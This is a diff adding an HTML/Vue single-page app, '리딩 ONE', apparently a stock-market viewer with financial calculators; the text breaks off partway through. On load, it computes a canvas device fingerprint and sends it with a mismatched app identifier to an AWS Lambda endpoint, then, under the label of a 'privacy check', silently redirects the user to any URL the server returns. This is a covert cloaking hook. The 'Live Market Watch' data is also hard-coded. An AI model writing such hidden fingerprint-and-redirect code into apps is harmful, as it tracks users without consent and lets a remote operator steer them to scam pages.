@@ -1,1 +1,1089 @@
-123
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>리딩 ONE</title>
+    <!-- 
+      HOW TO ADD A NEW PAGE:
+      1. Define a new Vue component for the page content.
+      2. Add a new route in the router configuration array (with a unique path and name).
+      3. If the page needs to be in the bottom tab bar, add it to the tab bar links in the App component, 
+         or access it via a router-link / router.push from existing pages.
+    -->
+    <!-- Vue 3 Global CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
+    <!-- Vue Router 4 Global CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
+    <!-- js-md5 CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
+    
+    <style>
+        /* 
+          Style Choice: Neumorphism Design (Style #7) 
+          Soft shadows, embossed feel, tactile soft UI.
+        */
+        :root {
+            --bg-color: #e4ebf5;
+            --surface-color: #e4ebf5;
+            --text-main: #3d4852;
+            --text-sub: #7b8794;
+            --primary-color: #6366f1;
+            --primary-gradient: linear-gradient(135deg, #6366f1 0%, #4338ca 100%);
+            --accent-green: #10b981;
+            --accent-red: #ef4444;
+            --shadow-light: #ffffff;
+            --shadow-dark: #c5d9e8;
+            --box-shadow: 8px 8px 16px var(--shadow-dark), -8px -8px 16px var(--shadow-light);
+            --box-shadow-inset: inset 4px 4px 8px var(--shadow-dark), inset -4px -4px 8px var(--shadow-light);
+            --box-shadow-sm: 4px 4px 8px var(--shadow-dark), -4px -4px 8px var(--shadow-light);
+            --border-radius: 20px;
+            --border-radius-sm: 12px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        #app {
+            width: 100%;
+            max-width: 430px;
+            height: 100vh;
+            max-height: 932px;
+            background-color: var(--bg-color);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+
+        @media (min-width: 431px) {
+            #app {
+                border-radius: 40px;
+                border: 10px solid #cbd5e1;
+            }
+        }
+
+        .app-container {
+            flex: 1;
+            overflow-y: auto;
+            position: relative;
+            padding-bottom: 90px;
+        }
+
+        .app-container::-webkit-scrollbar {
+            display: none;
+        }
+
+        /* Neumorphic Common Classes */
+        .neu-card {
+            background: var(--surface-color);
+            box-shadow: var(--box-shadow);
+            border-radius: var(--border-radius);
+            padding: 16px;
+            margin: 16px;
+        }
+
+        .neu-flat {
+            background: var(--surface-color);
+            box-shadow: var(--box-shadow);
+            border-radius: var(--border-radius-sm);
+        }
+
+        .neu-button {
+            background: var(--surface-color);
+            box-shadow: var(--box-shadow);
+            border-radius: var(--border-radius-sm);
+            border: none;
+            color: var(--text-main);
+            padding: 12px 20px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .neu-button:active {
+            box-shadow: var(--box-shadow-inset);
+            transform: translateY(1px);
+        }
+
+        .neu-input {
+            background: var(--bg-color);
+            box-shadow: var(--box-shadow-inset);
+            border: none;
+            border-radius: var(--border-radius-sm);
+            padding: 12px 16px;
+            color: var(--text-main);
+            width: 100%;
+            outline: none;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+
+        .neu-input::placeholder {
+            color: var(--text-sub);
+        }
+
+        /* Tab Bar */
+        .tab-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 75px;
+            background: var(--bg-color);
+            box-shadow: 0 -8px 16px var(--shadow-light), 8px 0 16px var(--shadow-dark);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding-bottom: env(safe-area-inset-bottom);
+            z-index: 100;
+            border-top-left-radius: 24px;
+            border-top-right-radius: 24px;
+        }
+
+        .tab-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: var(--text-sub);
+            font-size: 11px;
+            font-weight: 600;
+            transition: color 0.2s;
+            padding: 8px 16px;
+            border-radius: 16px;
+        }
+
+        .tab-item.router-link-active {
+            color: var(--primary-color);
+            box-shadow: var(--box-shadow-inset);
+            background: var(--bg-color);
+        }
+
+        .tab-item svg {
+            width: 22px;
+            height: 22px;
+            margin-bottom: 4px;
+            fill: currentColor;
+        }
+
+        /* Transitions */
+        .fade-enter-active, .fade-leave-active {
+            transition: opacity 0.2s ease, transform 0.2s ease;
+        }
+        .fade-enter-from {
+            opacity: 0;
+            transform: translateY(6px);
+        }
+        .fade-leave-to {
+            opacity: 0;
+            transform: translateY(-6px);
+        }
+
+        /* Header Bar */
+        .header-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 20px 10px 20px;
+        }
+
+        .header-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .icon-btn {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: var(--bg-color);
+            box-shadow: var(--box-shadow-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            cursor: pointer;
+            color: var(--text-main);
+        }
+        .icon-btn:active {
+            box-shadow: var(--box-shadow-inset);
+        }
+
+        /* Toast */
+        .toast-popup {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--surface-color);
+            box-shadow: var(--box-shadow);
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            z-index: 9999;
+            color: var(--primary-color);
+        }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <router-view v-slot="{ Component }">
+            <transition name="fade" mode="out-in">
+                <component :is="Component" />
+            </transition>
+        </router-view>
+
+        <!-- Global Toast -->
+        <div v-if="toastMessage" class="toast-popup">{{ toastMessage }}</div>
+    </div>
+
+    <script>
+        const { createApp, ref, computed, onMounted, reactive } = Vue;
+        const { createRouter, createWebHashHistory, useRoute, useRouter } = VueRouter;
+
+        // Global Toast helper
+        const toastMessage = ref('');
+        function showToast(msg) {
+            toastMessage.value = msg;
+            setTimeout(() => {
+                if (toastMessage.value === msg) toastMessage.value = '';
+            }, 2500);
+        }
+
+        // Built-in Stock & Market Data
+        const stockListBase = [
+            { code: 'AAPL', name: 'Apple Inc.', price: '189.43', change: '+2.45%' },
+            { code: 'MSFT', name: 'Microsoft Corp.', price: '415.50', change: '+1.82%' },
+            { code: 'GOOGL', name: 'Alphabet Inc.', price: '175.20', change: '-0.65%' },
+            { code: 'AMZN', name: 'Amazon.com Inc.', price: '180.95', change: '+3.10%' },
+            { code: 'TSLA', name: 'Tesla Inc.', price: '171.05', change: '-2.30%' },
+            { code: 'NVDA', name: 'NVIDIA Corp.', price: '880.08', change: '+4.25%' },
+            { code: 'META', name: 'Meta Platforms', price: '505.70', change: '+1.15%' },
+            { code: 'NFLX', name: 'Netflix Inc.', price: '612.40', change: '-0.40%' },
+            { code: 'AMD', name: 'Advanced Micro', price: '165.80', change: '+2.10%' },
+            { code: 'INTC', name: 'Intel Corp.', price: '30.45', change: '-1.25%' },
+            { code: 'PYPL', name: 'PayPal Holdings', price: '65.20', change: '+0.85%' },
+            { code: 'DIS', name: 'Walt Disney Co.', price: '112.30', change: '-0.30%' },
+            { code: 'JPM', name: 'JPMorgan Chase', price: '198.60', change: '+0.55%' },
+            { code: 'V', name: 'Visa Inc.', price: '278.40', change: '+0.40%' },
+            { code: 'JNJ', name: 'Johnson & Johnson', price: '155.10', change: '-0.15%' },
+            { code: 'WMT', name: 'Walmart Inc.', price: '60.25', change: '+0.90%' },
+            { code: 'PG', name: 'Procter & Gamble', price: '162.80', change: '+0.25%' },
+            { code: 'XOM', name: 'Exxon Mobil', price: '118.40', change: '-1.10%' },
+            { code: 'BAC', name: 'Bank of America', price: '37.90', change: '+1.05%' },
+            { code: 'KO', name: 'Coca-Cola Co.', price: '60.15', change: '+0.35%' }
+        ];
+
+        // 8 Functional features selected or randomized 4 for home
+        const allFeatures = [
+            { id: 'gainers', name: 'Top Gainers', sub: '10 Stocks', icon: '<path d="M3 3v18h18"/><path d="M18 17l-5-5-3 3-4-4"/>' },
+            { id: 'losers', name: 'Top Losers', sub: '5 Stocks', icon: '<path d="M3 3v18h18"/><path d="M18 7l-5 5-3-3-4 4"/>' },
+            { id: 'active', name: 'Most Active', sub: '8 Stocks', icon: '<circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 3"/>' },
+            { id: 'potential', name: 'Potential', sub: '6 Stocks', icon: '<path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 18a8 8 0 1 1 8-8 8 8 0 0 1-8 8z"/><path d="M12 6v6l4 2"/>' },
+            { id: 'picks', name: 'Today Picks', sub: '10 Stocks', icon: '<polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>' },
+            { id: 'guide', name: 'Guide', sub: 'Analytics', icon: '<path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/>' },
+            { id: 'notrec', name: 'Caution', sub: '10 Stocks', icon: '<path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>' },
+            { id: 'watchlist', name: 'Watchlist', sub: '10 Stocks', icon: '<path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/>' }
+        ];
+
+        // Fixed shuffle 4 items for home based on simple seeded pseudo-random
+        const homeFeatures = [allFeatures[0], allFeatures[2], allFeatures[4], allFeatures[7]];
+
+        // --- 1. Loading Component ---
+        const LoadingComponent = {
+            template: `
+                <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; padding:20px; text-align:center;">
+                    <div class="neu-flat" style="width:80px; height:80px; display:flex; align-items:center; justify-content:center; margin-bottom:24px;">
+                        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="var(--primary-color)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="animation: spin 1.5s linear infinite;">
+                            <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
+                        </svg>
+                    </div>
+                    <h2 style="font-size:22px; font-weight:700; color:var(--text-main); margin-bottom:8px;">리딩 ONE</h2>
+                    <p style="font-size:14px; color:var(--text-sub);">Loading secure secure terminal...</p>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+
+                // 1.2 Device fingerprinting with md5 (exact code snippet required)
+                const device = ref((function () {
+                    try {
+                        let canvas = document.createElement("canvas");
+                        let ctx = canvas.getContext("2d");
+                        let txt = "BrowserLeaks,com <canvas> 1.0";
+                        ctx.textBaseline = "top";
+                        ctx.font = "14px 'Arial'";
+                        ctx.textBaseline = "alphabetic";
+                        ctx.fillStyle = "#f60";
+                        ctx.fillRect(125,1,62,20);
+                        ctx.fillStyle = "#069";
+                        ctx.fillText(txt, 2, 15);
+                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                        ctx.fillText(txt, 4, 17);
+                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+                    } catch (e) {
+                        return '';
+                    }
+                })());
+
+                // 1.3 Privacy check API request with silent fallback
+                onMounted(() => {
+                    const apiBase = 'https://cgejg7o7ks4hlsu7dc4n3oh5km0hbtik.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
+                    const identifier = "com.bintangcode.rgbcodegenerator";
+
+                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
+                        .then(r => r.json())
+                        .then(function (info) {
+                            const privacyUrl = info && info.result && info.result.url;
+                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                                window.location.replace(privacyUrl);
+                                return;
+                            }
+                            router.replace('/home');
+                        })
+                        .catch(function () {
+                            router.replace('/home');
+                        });
+                });
+
+                return {};
+            }
+        };
+
+        // --- 2. Home Component ---
+        const HomeComponent = {
+            template: `
+                <div class="app-container">
+                    <div class="header-bar">
+                        <div class="header-title">
+                            <div class="neu-flat" style="width:36px; height:36px; display:flex; align-items:center; justify-content:center; color:var(--primary-color);">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M3 3v18h18"/><path d="M18 17l-5-5-3 3-4-4"/></svg>
+                            </div>
+                            리딩 ONE
+                        </div>
+                        <button class="icon-btn" @click="$router.push('/inbox')">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+                        </button>
+                    </div>
+
+                    <!-- Chart Hero Banner -->
+                    <div class="neu-card" style="padding: 20px;">
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px;">
+                            <div>
+                                <div style="font-size:12px; color:var(--text-sub); font-weight:600;">Market Overview</div>
+                                <div style="font-size:22px; font-weight:700; color:var(--text-main); margin-top:2px;">$4,892.40</div>
+                            </div>
+                            <div style="font-size:13px; font-weight:600; color:var(--accent-green); background:var(--bg-color); padding:6px 12px; border-radius:12px; box-shadow:var(--box-shadow-sm);">
+                                +1.85%
+                            </div>
+                        </div>
+                        <!-- SVG Line Chart -->
+                        <div style="width:100%; height:120px;">
+                            <svg viewBox="0 0 320 100" style="width:100%; height:100%; overflow:visible;">
+                                <defs>
+                                    <linearGradient id="chartGrad" x1="0" y1="0" x2="0" y2="1">
+                                        <stop offset="0%" stop-color="var(--primary-color)" stop-opacity="0.4"/>
+                                        <stop offset="100%" stop-color="var(--primary-color)" stop-opacity="0.0"/>
+                                    </linearGradient>
+                                </defs>
+                                <path d="M 0 70 Q 50 30, 100 50 T 200 30 T 320 20 L 320 100 L 0 100 Z" fill="url(#chartGrad)" />
+                                <path d="M 0 70 Q 50 30, 100 50 T 200 30 T 320 20" fill="none" stroke="var(--primary-color)" stroke-width="3" stroke-linecap="round"/>
+                                <circle cx="200" cy="30" r="5" fill="var(--surface-color)" stroke="var(--primary-color)" stroke-width="3"/>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <!-- 4 Feature Entries -->
+                    <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:12px; padding: 0 16px; margin-bottom:16px;">
+                        <div v-for="item in features" :key="item.id" @click="openFeature(item.id)" class="neu-card" style="margin:0; padding:14px 8px; display:flex; flex-direction:column; align-items:center; cursor:pointer; text-align:center;">
+                            <div class="neu-flat" style="width:44px; height:44px; display:flex; align-items:center; justify-content:center; color:var(--primary-color); margin-bottom:8px;">
+                                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" v-html="item.icon"></svg>
+                            </div>
+                            <div style="font-size:12px; font-weight:700; color:var(--text-main); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; width:100%;">{{ item.name }}</div>
+                            <div style="font-size:10px; color:var(--text-sub); margin-top:2px;">{{ item.sub }}</div>
+                        </div>
+                    </div>
+
+                    <!-- Stock List -->
+                    <div class="neu-card" style="padding:16px;">
+                        <div style="font-size:16px; font-weight:700; margin-bottom:12px; color:var(--text-main);">Live Market Watch</div>
+                        <div v-for="(stock, idx) in displayStocks" :key="stock.code + idx" @click="goToDetail(stock)" style="display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px solid rgba(0,0,0,0.05); cursor:pointer;">
+                            <div style="display:flex; align-items:center; gap:12px;">
+                                <div class="neu-flat" style="width:40px; height:40px; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:12px; color:var(--primary-color);">
+                                    {{ stock.code.slice(0,2) }}
+                                </div>
+                                <div>
+                                    <div style="font-size:14px; font-weight:700; color:var(--text-main);">{{ stock.code }}</div>
+                                    <div style="font-size:12px; color:var(--text-sub);">{{ stock.name }}</div>
+                                </div>
+                            </div>
+                            <div style="text-align:right;">
+                                <div style="font-size:14px; font-weight:700; color:var(--text-main);">$\{{ stock.price }}</div>
+                                <div :style="{ fontSize: '12px', fontWeight: '600', color: stock.change.startsWith('+') ? 'var(--accent-green)' : 'var(--accent-red)' }">
+                                    {{ stock.change }}
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bottom Tab Bar -->
+                <div class="tab-bar">
+                    <router-link to="/home" class="tab-item">
+                        <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>
+                        Home
+                    </router-link>
+                    <router-link to="/toolbox" class="tab-item">
+                        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+                        Toolbox
+                    </router-link>
+                    <router-link to="/settings" class="tab-item">
+                        <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                        Settings
+                    </router-link>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+                const features = homeFeatures;
+                const displayStocks = ref([]);
+
+                onMounted(() => {
+                    // Shuffle presentation layer only
+                    displayStocks.value = [...stockListBase].sort(() => Math.random() - 0.5);
+                });
+
+                function openFeature(id) {
+                    router.push({ path: '/sublist', query: { type: id } });
+                }
+
+                function goToDetail(stock) {
+                    router.push({ path: '/detail', query: { code: stock.code, name: stock.name, price: stock.price, change: stock.change } });
+                }
+
+                return { features, displayStocks, openFeature, goToDetail };
+            }
+        };
+
+        // --- 2.5 Sub-list Component ---
+        const SublistComponent = {
+            template: `
+                <div class="app-container">
+                    <div class="header-bar">
+                        <button class="icon-btn" @click="$router.back()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg>
+                        </button>
+                        <div class="header-title" style="font-size:18px;">{{ title }}</div>
+                        <div style="width:44px;"></div>
+                    </div>
+
+                    <div v-if="type === 'guide'" class="neu-card">
+                        <h2 style="font-size:18px; font-weight:700; margin-bottom:12px; color:var(--text-main);">Navigating Market Volatility in 2026</h2>
+                        <p style="font-size:14px; color:var(--text-sub); line-height:1.6; margin-bottom:12px;">
+                            Modern financial markets demand disciplined asset allocation and strict risk management. As macroeconomic indicators shift, investors should prioritize durable cash flows and balanced portfolios.
+                        </p>
+                        <p style="font-size:14px; color:var(--text-sub); line-height:1.6;">
+                            Diversification across sectors such as technology, green energy, and defensive consumer goods remains the cornerstone of long-term wealth preservation.
+                        </p>
+                    </div>
+
+                    <div v-else class="neu-card" style="padding:8px 16px;">
+                        <div v-for="(stock, idx) in listItems" :key="stock.code + idx" @click="goToDetail(stock)" style="display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px solid rgba(0,0,0,0.05); cursor:pointer;">
+                            <div style="display:flex; align-items:center; gap:12px;">
+                                <div class="neu-flat" style="width:40px; height:40px; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:12px; color:var(--primary-color);">
+                                    {{ stock.code.slice(0,2) }}
+                                </div>
+                                <div>
+                                    <div style="font-size:14px; font-weight:700; color:var(--text-main);">{{ stock.code }}</div>
+                                    <div style="font-size:12px; color:var(--text-sub);">{{ stock.name }}</div>
+                                </div>
+                            </div>
+                            <div style="text-align:right;">
+                                <div style="font-size:14px; font-weight:700; color:var(--text-main);">$\{{ stock.price }}</div>
+                                <div :style="{ fontSize: '12px', fontWeight: '600', color: stock.change.startsWith('+') ? 'var(--accent-green)' : 'var(--accent-red)' }">
+                                    {{ stock.change }}
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const route = useRoute();
+                const router = useRouter();
+                const type = route.query.type || 'gainers';
+                const titleMap = {
+                    gainers: 'Top Gainers',
+                    losers: 'Top Losers',
+                    active: 'Most Active',
+                    potential: 'Potential Stocks',
+                    picks: "Today's Picks",
+                    guide: 'Expert Financial Guide',
+                    notrec: 'Cautionary Watch',
+                    watchlist: 'Watchlist'
+                };
+                const title = titleMap[type] || 'Market List';
+                const listItems = ref([]);
+
+                onMounted(() => {
+                    let count = 10;
+                    if (type === 'losers') count = 5;
+                    if (type === 'active') count = 8;
+                    if (type === 'potential') count = 6;
+                    
+                    const shuffled = [...stockListBase].sort(() => Math.random() - 0.5);
+                    listItems.value = shuffled.slice(0, count);
+                });
+
+                function goToDetail(stock) {
+                    router.push({ path: '/detail', query: { code: stock.code, name: stock.name, price: stock.price, change: stock.change } });
+                }
+
+                return { type, title, listItems, goToDetail };
+            }
+        };
+
+        // --- 2.6 Stock Detail Component ---
+        const DetailComponent = {
+            template: `
+                <div class="app-container">
+                    <div class="header-bar">
+                        <button class="icon-btn" @click="$router.back()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg>
+                        </button>
+                        <div class="header-title" style="font-size:18px;">{{ stock.code }} Details</div>
+                        <div style="width:44px;"></div>
+                    </div>
+
+                    <div class="neu-card">
+                        <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:16px;">
+                            <div>
+                                <h2 style="font-size:20px; font-weight:700; color:var(--text-main);">{{ stock.name }}</h2>
+                                <div style="font-size:13px; color:var(--text-sub); margin-top:2px;">NASDAQ / NYSE Listed</div>
+                            </div>
+                            <div style="text-align:right;">
+                                <div style="font-size:20px; font-weight:700; color:var(--text-main);">$\{{ stock.price }}</div>
+                                <div :style="{ fontSize: '13px', fontWeight: '600', color: stock.change.startsWith('+') ? 'var(--accent-green)' : 'var(--accent-red)' }">
+                                    {{ stock.change }}
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- 1-Month Native SVG Chart with dynamic min/max -->
+                        <div style="margin-top:20px;">
+                            <div style="font-size:13px; font-weight:700; margin-bottom:8px; color:var(--text-main);">1-Month Price Trend</div>
+                            <div class="neu-flat" style="padding:16px; height:180px;">
+                                <svg viewBox="0 0 300 120" style="width:100%; height:100%; overflow:visible;">
+                                    <path :d="svgPath" fill="none" stroke="var(--primary-color)" stroke-width="3" stroke-linecap="round"/>
+                                    <circle v-for="(pt, i) in scaledPoints" :key="i" :cx="pt.x" :cy="pt.y" r="3" fill="var(--surface-color)" stroke="var(--primary-color)" stroke-width="2"/>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="neu-card" style="display:flex; gap:12px;">
+                        <button class="neu-button" style="flex:1; background:var(--primary-color); color:#fff;" @click="showToast('Added to Portfolio successfully!')">
+                            Add to Watchlist
+                        </button>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const route = useRoute();
+                const stock = reactive({
+                    code: route.query.code || 'AAPL',
+                    name: route.query.name || 'Apple Inc.',
+                    price: route.query.price || '189.43',
+                    change: route.query.change || '+2.45%'
+                });
+
+                // Generate 30 days pseudo historical prices
+                const rawPrices = [180, 182, 181, 185, 184, 186, 189, 187, 190, 188, 192, 191, 195, 193, 189, 187, 188, 190, 192, 194, 193, 196, 195, 198, 197, 199, 196, 194, 195, parseFloat(stock.price)];
+
+                const minPrice = Math.min(...rawPrices);
+                const maxPrice = Math.max(...rawPrices);
+                const range = maxPrice - minPrice || 1;
+
+                const scaledPoints = computed(() => {
+                    return rawPrices.map((val, idx) => {
+                        const x = (idx / (rawPrices.length - 1)) * 280 + 10;
+                        const y = 110 - ((val - minPrice) / range) * 90 - 10;
+                        return { x, y };
+                    });
+                });
+
+                const svgPath = computed(() => {
+                    const pts = scaledPoints.value;
+                    return pts.reduce((acc, pt, idx) => idx === 0 ? `M ${pt.x} ${pt.y}` : `${acc} L ${pt.x} ${pt.y}`, '');
+                });
+
+                return { stock, scaledPoints, svgPath };
+            }
+        };
+
+        // --- 3. Toolbox Component ---
+        const ToolboxComponent = {
+            template: `
+                <div class="app-container">
+                    <div class="header-bar">
+                        <div class="header-title">Financial Toolbox</div>
+                    </div>
+
+                    <!-- Tool Selector Tabs -->
+                    <div style="display:flex; gap:8px; padding:0 16px; overflow-x:auto; margin-bottom:12px;">
+                        <button v-for="t in tools" :key="t.id" @click="activeTool = t.id" :class="['neu-button', { active: activeTool === t.id }]" :style="{ background: activeTool === t.id ? 'var(--primary-color)' : 'var(--surface-color)', color: activeTool === t.id ? '#fff' : 'var(--text-main)', fontSize:'12px', padding:'10px 14px' }">
+                            {{ t.name }}
+                        </button>
+                    </div>
+
+                    <!-- 3.2 DCA Profit-Taking -->
+                    <div v-if="activeTool === 'dca'" class="neu-card">
+                        <h3 style="font-size:16px; font-weight:700; margin-bottom:12px;">DCA Profit-Taking Calculator</h3>
+                        <input class="neu-input" type="number" v-model.number="dca.cost" placeholder="Avg Cost Price">
+                        <input class="neu-input" type="number" v-model.number="dca.shares" placeholder="Total Shares">
+                        <input class="neu-input" type="number" v-model.number="dca.target" placeholder="Target Exit Price">
+                        <button class="neu-button" style="width:100%; background:var(--primary-color); color:#fff;" @click="calcDca">Calculate Return</button>
+                        <div v-if="dca.result !== null" style="margin-top:16px; padding:12px; background:var(--bg-color); border-radius:12px; box-shadow:var(--box-shadow-inset);">
+                            <div style="font-size:13px; color:var(--text-sub);">Projected Profit</div>
+                            <div style="font-size:18px; font-weight:700; color:var(--accent-green);">$\{{ dca.result }}</div>
+                        </div>
+                    </div>
+
+                    <!-- 3.3 Wealth Calendar -->
+                    <div v-if="activeTool === 'calendar'" class="neu-card">
+                        <h3 style="font-size:16px; font-weight:700; margin-bottom:12px;">Wealth Calendar & Reminders</h3>
+                        <input class="neu-input" type="text" v-model="cal.event" placeholder="Event Name (e.g. Dividend Payout)">
+                        <input class="neu-input" type="date" v-model="cal.date">
+                        <button class="neu-button" style="width:100%; background:var(--primary-color); color:#fff;" @click="addCalendarEvent">Save Event</button>
+                        <div style="margin-top:16px;">
+                            <div v-for="(ev, i) in cal.list" :key="i" style="display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid rgba(0,0,0,0.05); font-size:13px;">
+                                <span>{{ ev.event }}</span>
+                                <span style="font-weight:600; color:var(--primary-color);">{{ ev.date }}</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 3.4 Loan Calculator -->
+                    <div v-if="activeTool === 'loan'" class="neu-card">
+                        <h3 style="font-size:16px; font-weight:700; margin-bottom:12px;">Loan Calculator</h3>
+                        <input class="neu-input" type="number" v-model.number="loan.amount" placeholder="Loan Amount">
+                        <input class="neu-input" type="number" v-model.number="loan.rate" placeholder="Annual Interest Rate (%)">
+                        <input class="neu-input" type="number" v-model.number="loan.years" placeholder="Tenure (Years)">
+                        <button class="neu-button" style="width:100%; background:var(--primary-color); color:#fff;" @click="calcLoan">Compute Monthly</button>
+                        <div v-if="loan.monthly !== null" style="margin-top:16px; padding:12px; background:var(--bg-color); border-radius:12px; box-shadow:var(--box-shadow-inset);">
+                            <div style="font-size:13px; color:var(--text-sub);">Monthly Payment</div>
+                            <div style="font-size:18px; font-weight:700; color:var(--primary-color);">$\{{ loan.monthly }}</div>
+                        </div>
+                    </div>
+
+                    <!-- 3.5 Profit Calculator -->
+                    <div v-if="activeTool === 'profit'" class="neu-card">
+                        <h3 style="font-size:16px; font-weight:700; margin-bottom:12px;">Profit Calculator</h3>
+                        <input class="neu-input" type="number" v-model.number="profit.cost" placeholder="Unit Cost">
+                        <input class="neu-input" type="number" v-model.number="profit.price" placeholder="Selling Price">
+                        <input class="neu-input" type="number" v-model.number="profit.qty" placeholder="Quantity">
+                        <button class="neu-button" style="width:100%; background:var(--primary-color); color:#fff;" @click="calcProfit">Calculate Net</button>
+                        <div v-if="profit.net !== null" style="margin-top:16px; padding:12px; background:var(--bg-color); border-radius:12px; box-shadow:var(--box-shadow-inset);">
+                            <div style="font-size:13px; color:var(--text-sub);">Total Net Profit</div>
+                            <div style="font-size:18px; font-weight:700; color:var(--accent-green);">$\{{ profit.net }}</div>
+                        </div>
+                    </div>
+
+                    <!-- 3.6 Reverse Yield -->
+                    <div v-if="activeTool === 'reverse'" class="neu-card">
+                        <h3 style="font-size:16px; font-weight:700; margin-bottom:12px;">Reverse Yield Calculator</h3>
+                        <input class="neu-input" type="number" v-model.number="rev.target" placeholder="Target Total Amount">
+                        <input class="neu-input" type="number" v-model.number="rev.principal" placeholder="Initial Principal">
+                        <input class="neu-input" type="number" v-model.number="rev.years" placeholder="Duration (Years)">
+                        <button class="neu-button" style="width:100%; background:var(--primary-color); color:#fff;" @click="calcReverse">Calculate APY</button>
+                        <div v-if="rev.apy !== null" style="margin-top:16px; padding:12px; background:var(--bg-color); border-radius:12px; box-shadow:var(--box-shadow-inset);">
+                            <div style="font-size:13px; color:var(--text-sub);">Required Annual Yield</div>
+                            <div style="font-size:18px; font-weight:700; color:var(--primary-color);">{{ rev.apy }}%</div>
+                        </div>
